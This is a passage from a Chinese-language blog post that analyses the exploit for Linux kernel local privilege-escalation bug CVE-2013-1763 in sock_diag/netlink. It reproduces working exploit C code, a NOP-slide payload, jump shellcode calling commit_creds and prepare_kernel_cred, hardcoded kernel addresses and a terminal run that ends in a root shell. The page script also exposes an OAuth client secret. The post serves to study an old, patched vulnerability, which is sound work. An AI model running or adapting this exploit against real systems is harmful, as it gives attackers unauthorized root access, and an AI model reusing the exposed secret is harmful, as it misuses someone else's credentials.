<span class="comment">//创建一个netlink协议的socket，因为__sock_diag_rcv_msg函数是属于NETLINK_SOCK_DIAG的</span></span><br><span class="line">  <span class="keyword">if</span> ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Can't create sock diag socket\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//填充数据包，就是为了最终能够执行到__sock_diag_rcv_msg中去</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">  req.nlh.nlmsg_len = <span class="keyword">sizeof</span>(req);</span><br><span class="line">  req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;</span><br><span class="line">  req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;</span><br><span class="line">  req.nlh.nlmsg_seq = <span class="number">123456</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//req.r.sdiag_family = 89;</span></span><br><span class="line">  req.r.udiag_states = <span class="number">-1</span>;</span><br><span class="line">  req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Run: %s Fedora|Ubuntu\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>],<span class="string">"Fedora"</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">    commit_creds = (_commit_creds) get_symbol(<span class="string">"commit_creds"</span>);</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) get_symbol(<span class="string">"prepare_kernel_cred"</span>);</span><br><span class="line">    sock_diag_handlers = get_symbol(<span class="string">"sock_diag_handlers"</span>);</span><br><span class="line">    nl_table = get_symbol(<span class="string">"nl_table"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!prepare_kernel_cred || !commit_creds || !sock_diag_handlers || !nl_table)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"some symbols are not available!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    family = (nl_table - sock_diag_handlers) / <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"family=%d\n"</span>,family);</span><br><span class="line">    req.r.sdiag_family = family;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(family&gt;<span class="number">255</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"nl_table is too far!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>],<span class="string">"Ubuntu"</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">    commit_creds = (_commit_creds) <span class="number">0xc106bc60</span>;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) <span class="number">0xc106bea0</span>;</span><br><span class="line">    req.r.sdiag_family = <span class="number">81</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_start, mmap_size;</span><br><span class="line">  mmap_start = <span class="number">0x10000</span>;  <span class="comment">//选择了一块1MB多的内存区域</span></span><br><span class="line">  mmap_size = <span class="number">0x120000</span>;  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"mmapping at 0x%lx, size = 0x%lx\n"</span>, mmap_start, mmap_size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mmap((<span class="keyword">void</span>*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">                MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == MAP_FAILED) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"mmap fault\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span>*)mmap_start, <span class="number">0x90</span>, mmap_size);         <span class="comment">//将其全部填充为0x90，在X86系统中对应的是NOP指令</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> jump[] = <span class="string">"\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"</span>; <span class="comment">// jump_payload in asm</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *asd = &amp;jump[<span class="number">4</span>];</span><br><span class="line">  *asd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)kernel_code; <span class="comment">//使用kernel_code函数的地址替换掉jump[]中的0x11</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//将jump这段代码放在mmap内存区域的最后，也就是说只要最后能够跳转到这块区域，就可以执行到jump代码，进而跳转执行kernel_code，因为这块区域中布满了NOP指令。</span></span><br><span class="line">  <span class="built_in">memcpy</span>( (<span class="keyword">void</span>*)mmap_start+mmap_size-<span class="keyword">sizeof</span>(jump), jump, <span class="keyword">sizeof</span>(jump));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//所有准备工作完成之后，最后在这里发送socket触发这个漏洞</span></span><br><span class="line">  <span class="keyword">if</span> ( send(fd, &amp;req, <span class="keyword">sizeof</span>(req), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bad send\n"</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"uid=%d, euid=%d\n"</span>,getuid(), geteuid() );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!getuid())</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="6-exploit代码分析"><a href="#6-exploit代码分析" class="headerlink" title="6. exploit代码分析"></a>6. exploit代码分析</h2><p>在分析之前，有些概念要澄清一下，在linux系统中，用户空间和内核空间是独立存在的。在一个32位的linux系统中，每个进程会虚拟出4G的内存空间，其中3G是用户空间，1G是内核空间，用户空间的地址范围是0&times;00000000 到 0xBFFFFFFF，内核空间的地址是0xC0000000 到 0xFFFFFFFF。内核地址空间由所有进程共享，但只有运行在内核态的进程才能访问，用户进程可以通过系统调用切换到内核态访问内核空间，进程运行在内核态时所产生的地址都属于内核空间。<code>commit_creds</code>和<code>prepare_kernel_cred</code>均为内核函数，如果要执行他们就应该切换到内核状态运行。当执行内核函数<code>__sock_diag_rcv_msg</code>是处于内核态的，所以这个时候调用执行kernel_code函数就可以取得root权限。</p>
<p>那么如何调用kernel_code函数呢？所有我们mmap了一块从0x10000开始0x120000大小的内存空间，然后将这块空间写满NOP指令，将跳转执行kernel_code的代码放在这块区域的最后面，也就是说，只要跳转执行到这块内存区域的（除了jump代码块内部）都会顺利跑到kernel_code函数。这种方法叫做<strong>NOP slide</strong>，就像坐滑滑梯一样，自然滑到底部。jump这一段代码的分析如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> jump[] = <span class="string">"\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"</span>; <span class="comment">// jump_payload in asm</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *asd = &amp;jump[<span class="number">4</span>];</span><br><span class="line">  *asd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)kernel_code;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">jump_payload_not_used</span><span class="params">(<span class="keyword">void</span> *skb, <span class="keyword">void</span> *nlh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"mov $kernel_code, %eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"call *%eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ gcc CVE<span class="number">-2013</span><span class="number">-1763.</span>c</span><br><span class="line">CVE<span class="number">-2013</span><span class="number">-1763.</span>c: In function ‘main’:</span><br><span class="line">CVE<span class="number">-2013</span><span class="number">-1763.</span>c:<span class="number">148</span>:<span class="number">26</span>: warning: initialization from incompatible pointer type [enabled by <span class="keyword">default</span>]</span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ objdump -D a.out</span><br><span class="line">….</span><br><span class="line"><span class="number">08048763</span> &lt;jump_payload_not_used&gt;:</span><br><span class="line"> <span class="number">8048763</span>:  <span class="number">55</span>                     push   %ebp</span><br><span class="line"> <span class="number">8048764</span>:  <span class="number">89</span> e5                  mov    %esp,%ebp</span><br><span class="line"> <span class="number">8048766</span>:  b8 <span class="number">3</span>c <span class="number">87</span> <span class="number">04</span> <span class="number">08</span>         mov    $<span class="number">0x804873c</span>,%eax</span><br><span class="line"> <span class="number">804876b</span>:  ff d0                  call   *%eax</span><br><span class="line"> <span class="number">804876</span>d:  <span class="number">5</span>d                     pop    %ebp</span><br><span class="line"> <span class="number">804876</span>e:  c3                     ret   </span><br><span class="line">….</span><br><span class="line"></span><br><span class="line">(gdb) p/x jump</span><br><span class="line">$<span class="number">2</span> = &#123;<span class="number">0x55</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0xb8</span>, <span class="number">0x3c</span>, <span class="number">0x87</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x5d</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>&#125; <span class="comment">//最后发现0x11被填充成了kernel_code的地址</span></span><br><span class="line">(gdb) p kernel_code</span><br><span class="line">$<span class="number">4</span> = &#123;<span class="keyword">int</span> ()&#125; <span class="number">0x804873c</span> &lt;kernel_code&gt;</span><br></pre></td></tr></table></figure></p>
<p>问题的关键变成了如何才能跳转到这一块内存区域呢？先看看下面这结构体的定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> &#123;</span></span><br><span class="line">      __u32       nlmsg_len;  <span class="comment">/* Length of message including header */</span></span><br><span class="line">      __u16       nlmsg_type; <span class="comment">/* Message content */</span></span><br><span class="line">      __u16       nlmsg_flags;    <span class="comment">/* Additional flags */</span></span><br><span class="line">      __u32       nlmsg_seq;  <span class="comment">/* Sequence number */</span></span><br><span class="line">      __u32       nlmsg_pid;  <span class="comment">/* Sending process port ID */</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unix_diag_req</span> &#123;</span></span><br><span class="line">      __u8    sdiag_family;</span><br><span class="line">      __u8    sdiag_protocol;</span><br><span class="line">      __u16   pad;</span><br><span class="line">      __u32   udiag_states;</span><br><span class="line">      __u32   udiag_ino;</span><br><span class="line">      __u32   udiag_show;</span><br><span class="line">      __u32   udiag_cookie[<span class="number">2</span>];</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_handler</span> &#123;</span></span><br><span class="line">        __u8 family;<span class="comment">//</span></span><br><span class="line">        <span class="keyword">int</span> (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">netlink_table</span> &#123;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">nl_portid_hash</span>   <span class="title">hash</span>;</span> <span class="comment">//取回这个值</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>       <span class="title">mc_list</span>;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">listeners</span> __<span class="title">rcu</span>  *<span class="title">listeners</span>;</span></span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            flags;</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            groups;</span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>            *<span class="title">cb_mutex</span>;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">module</span>           *<span class="title">module</span>;</span></span><br><span class="line">         <span class="keyword">void</span>                    (*bind)(<span class="keyword">int</span> group);</span><br><span class="line">         <span class="keyword">int</span>                     registered;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">nl_portid_hash</span> &#123;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>       *<span class="title">table</span>;</span> <span class="comment">//四个字节</span></span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">long</span>           rehash_time; <span class="comment">//也是四个字节.0x00012b59//这个值在我们的那个范围内.</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            mask;</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            shift;</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            entries;</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            max_shift;</span><br><span class="line"> </span><br><span class="line">         u32                     rnd;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">netlink_table</span> *<span class="title">nl_table</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>我们的牛人发现了nl_table里面有一个变量rehash_time的值正好在0x10000-0x130000这个区域内，所以可以利用这个值来跳转，只需要将<code>sock_diag_handlers[sdiag_family]-dump</code>正好落在这个值上就可以了。如下图所示</p>
<p>所以我们需要先知道<code>nl_table</code>和<code>sock_diag_handlers</code>的地址，可以通过以下两种方式查看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms</span><br><span class="line">sudo cat /boot/System.map-3.2.0-43-generic-pae</span><br></pre></td></tr></table></figure></p>
<p>但是在ubuntu系统中前一种方法无法查看到变量函数的地址，所以只有使用第二种方法了，由于<code>nl_table</code>和 <code>sock_diag_handlers</code>都是指针，所以他们的大小都是4个字节。于是就可以计算出<code>sdiag_family</code>的取值了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep nl_table</span><br><span class="line">c189b5c0 d nl_table_lock</span><br><span class="line">c189b5c4 d nl_table_wait</span><br><span class="line">c1a488e0 b nl_table_users</span><br><span class="line">c1a488e4 b nl_table</span><br><span class="line">fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep sock_diag_handlers</span><br><span class="line">c1a487a0 b sock_diag_handlers</span><br><span class="line">(0xc1a488e4 - 0xc1a487a0) / 4 = 81L</span><br></pre></td></tr></table></figure></p>
<p>至此所有的谜题都解开了，然后就可以高高兴兴的黑自己一把了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fengguoqing@VirtualBox:~/Downloads$ gcc -o CVE-2013-1763 CVE-2013-1763.c</span><br><span class="line">CVE-2013-1763.c: In function ‘main’:</span><br><span class="line">CVE-2013-1763.c:148:26: warning: initialization from incompatible pointer type [enabled by default]</span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ id</span><br><span class="line">uid=1000(fengguoqing) gid=1000(fengguoqing) groups=1000(fengguoqing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)</span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ ./CVE-2013-1763 Ubuntu</span><br><span class="line">mmapping at 0x10000, size = 0x120000</span><br><span class="line">uid=0, euid=0</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
<p>由于在sock_diag_lock_handler中有mutex_lock(&amp;sock_diag_table_mutex)，但是我们在后面将程序引入到其他地方，并没有接着执行 mutex_unlock(&amp;sock_diag_table_mutex)，所以按道理只能root成功一次，但是我在测试中发现有时候可以root多次，有时候root一次之后就不能再root了，需要重启才可以重新root。</p>
<h2 id="7-参考网站"><a href="#7-参考网站" class="headerlink" title="7. 参考网站"></a>7. 参考网站</h2><p>CVE：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename…=CVE-2013-1763</a><br>NVD: <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">http://web.nvd.nist.gov/view/vuln/de…=CVE-2013-1763</a><br>Patch: CONFIRM:<a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0" target="_blank" rel="noopener">http://git.kernel.org/?p=linux/kerne…e0b6894ffd79c0</a><br>Exploit: <a href="http://www.exploit-db.com" target="_blank" rel="noopener">http://www.exploit-db.com</a><br>维基百科Netlink：<a href="http://zh.wikipedia.org/wiki/Netlink" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/Netlink</a> </p>

      
       <hr><span style="font-style: italic;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 fengguoqing611@gmail.com </span>
    </div>
</article>


<p>
    <a href="javascript:void(0)" class="dashang" onclick="dashangToggle()">赏</a>
</p>


<div class="article_copyright">
    <p><span>文章标题:</span>linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</p>
    
    <p><span>本文作者:</span><a href="javascript:void(0)" title="Frank Feng">Frank Feng</a></p>
    <p><span>发布时间:</span>2016-09-04, 20:52:20</p>
    <p><span>最后更新:</span>2017-11-26, 09:53:26</p>
    <span>原始链接:</span><a class="post-url" href="/2016/09/04/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/" title="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析">https://fengguoqing.github.io/2016/09/04/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/</a>
    <p>
        <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>


    
    <div id="comments"></div>
<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
<script>
    var gitment = new Gitment({
        id: 'https://fengguoqing.github.io/2016/09/04/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/', // 可选。默认为 location.href
        owner: 'fengguoqing',
        repo: 'fengguoqing.github.io',
        oauth: {
            client_id: 'd7749153f9a71a100129',
            client_secret: '1c8dbe60bbbed4d8288d2bccd8a87f5568a9eb0a',
        },
    })
    gitment.render('comments')
</script>
    



    

    </div>
    <div class="copyright">
        <p class="footer-entry">©2017 Frank Feng</p>
<p class="footer-entry">Buit with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" href="javascript:void(0)"></a>
    </div>
</div>
<div class="acParent"></div>
<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
    <div class="shang_tit">
        <p>喜欢就点赞,疼爱就打赏</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
    </div>
</div>
</body>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery.pjax/1.9.6/jquery.pjax.min.js"></script>
<script src="/js/script.js"></script>
<script>
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#功耗','#linux移植','#日常记录','#教程','#linux CVE-2013-1763 漏洞','#redmine','#系统安全','#Linux内核调试',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().split('\n').length - 1;
            var $numbering = $('<ul/>').addClass('pre-numbering').attr("unselectable","on");
            $(this).addClass('has-numbering')
                    .parent()
                    .append($numbering);
            for(i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*访问数量*/
        
        $.getScript("//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
    }

    /*打赏页面隐藏与展示*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    
</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 2px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: ;
    }
</style>

<!--自定义样式设置-->
<style>
    
    .nav-right nav a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 2px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /*引用块样式*/
    
    .post .pjax article blockquote {
        padding: 10px 20px;
        background-color: white;
        border: none;
        border-left: 4px solid #42b983;
        border-right: 4px solid #42b983;
        border-radius: 10px;
    }
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.1;
        background: url("http://oncj6b2vl.bkt.clouddn.com/FlSExUGfRSaqxkK5v42CpuI-tXAL.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    
</style>
</html>
